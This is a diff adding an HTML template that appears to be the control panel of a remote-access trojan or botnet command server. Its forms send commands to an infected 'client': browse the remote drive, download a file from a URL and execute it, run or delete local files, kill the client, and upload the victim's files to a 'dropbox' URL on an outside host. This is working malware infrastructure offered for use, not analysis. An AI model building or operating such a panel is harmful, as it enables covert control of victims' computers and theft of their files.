@@ -1,0 +1,83 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+<title>CMD</title>
+<script src="/prototype.js" type="text/javascript"></script>
+<script type="text/javascript">
+
+</script>
+</head>
+<body id="body">
+<div><a href="/cgi-bin/list">back to list</a></div>
+<div></div>
+<div>Client Name: %1</div>
+<div>Client Serial: %2</div>
+<div id="time" style="border: solid 1px">Last seen: %4, Next command sync: %5</div>
+<div></div>
+<div id="queue" style="border: solid 1px"><b>Outbox:</b><br />
+<br /><b>Reports:</b><br />
+<br /><b>Dropbox:</b><br />
+</div>
+<div></div>
+<div style="border: solid 1px">
+Order server to D<a href="cmd?cmd=DIE&i=%3">I</a>E (are you sure?).
+</div>
+<div style="border: solid 1px">
+Send a <a href="cmd?cmd=NOP&i=%3">Wakeup</a> command to make client sync quickly.
+<br />
+Send a <a href="cmd?cmd=SLP&i=%3">Sleep</a> command when you're done.</div>
+<div style="border: solid 1px">
+<a href="dir?go=drive&i=%3">Browse</a> files on remote computer | <a href="cmd?cmd=DIR&path=&i=%3">Preload</a> root.</div>
+<div style="border: solid 1px"><form action="cmd" method="get">
+<input type="hidden" name="i" value="%3" />
+<input type="hidden" name="cmd" value="GET" />
+Download file from url <input type="text" name="url" />
+to <input type="text" name="path" /> (localpath).<br />
+You can leave localpath empty for random file name.
+<input type="submit" value="go!" />
+</form></div>
+<div style="border: solid 1px"><form action="cmd" method="get">
+<input type="hidden" name="i" value="%3" />
+<input type="hidden" name="cmd" value="DAE" />
+Download file from url <input type="text" name="url" />
+and execute from <input type="text" name="path" /> (localpath).<br />
+localpath is required, but can be .\filename.ext for localpath generation.
+<input type="submit" value="go!" />
+</form></div>
+<div style="border: solid 1px"><form action="cmd" method="get">
+<input type="hidden" name="i" value="%3" />
+<input type="hidden" name="cmd" value="PUT" />
+Upload file from <input type="text" name="path" /> (localpath)
+to url <select name="url">
+<option value="https://bitspeercachedetect.com/cgi-bin/drop?id=%3&name=">dropbox</option>
+</select> <input type="submit" value="go!" />
+</form></div>
+<div style="border: solid 1px"><form action="cmd" method="get">
+<input type="hidden" name="i" value="%3" />
+<input type="hidden" name="cmd" value="DEL" />
+Delete file from <input type="text" name="path" /> (localpath)
+<input type="submit" value="go!" />
+</form></div>
+<div style="border: solid 1px"><form action="cmd" method="get">
+<input type="hidden" name="i" value="%3" />
+<input type="hidden" name="cmd" value="RUN" />
+Execute a file from <input type="text" name="path" /> (localpath)
+<input type="submit" value="go!" />
+</form></div>
+
+
+
+<script type="text/javascript"><!--
+new Ajax.PeriodicalUpdater('time', '/cgi-bin/cmd?i=%3&update=time', {
+        method: 'get',
+        frequency: 8, decay: 1
+});
+new Ajax.PeriodicalUpdater('queue', '/cgi-bin/cmd?i=%3&update=queue', {
+        method: 'get',
+        frequency: 8, decay: 1
+});
+--></script>
+</body>
+
+</html>
